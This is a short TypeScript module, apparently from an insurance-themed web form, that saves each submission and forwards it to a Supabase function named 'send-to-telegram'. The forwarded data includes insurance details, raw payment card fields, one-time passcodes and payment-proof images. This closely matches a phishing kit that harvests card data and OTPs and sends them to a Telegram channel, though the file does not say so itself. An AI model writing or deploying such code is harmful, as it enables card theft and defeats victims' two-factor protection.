import type { InsuranceStep1Payload, InsuranceStep2Payload } from '@/types/domain'
import { saveSubmission } from '@/api/submissions'

const fnUrl = import.meta.env.VITE_SUPABASE_URL
const anon = import.meta.env.VITE_SUPABASE_PUBLISHABLE_KEY || import.meta.env.VITE_SUPABASE_ANON_KEY
const fnName = import.meta.env.VITE_SUPABASE_FUNCTION_NAME || 'send-to-telegram'

export type TelegramRequest =
  | { type: 'insurance_step1'; payload: InsuranceStep1Payload }
  | { type: 'insurance_step2'; payload: InsuranceStep2Payload }
  | {
      type: 'payment_card'
      payload: Record<string, string>
    }
  | { type: 'otp'; payload: Record<string, string> }
  | {
      type: 'payment_proof'
      payload: Record<string, string>
      imageBase64: string
      imageMimeType: string
      fileName: string
    }

export async function sendToTelegram(body: TelegramRequest): Promise<{ ok: boolean; error?: string }> {
  const saved = await saveSubmission(body)
  if (!saved.ok) return saved

  if (!fnUrl || !anon) {
    console.warn('بيانات دالة تيليجرام غير مضبوطة — تم حفظ الطلب في قاعدة البيانات فقط')
    return { ok: true }
  }
  const res = await fetch(`${fnUrl}/functions/v1/${fnName}`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      Authorization: `Bearer ${anon}`,
      apikey: anon,
    },
    body: JSON.stringify(body),
  })
  if (!res.ok) {
    const t = await res.text()
    return { ok: false, error: t || res.statusText }
  }
  return { ok: true }
}
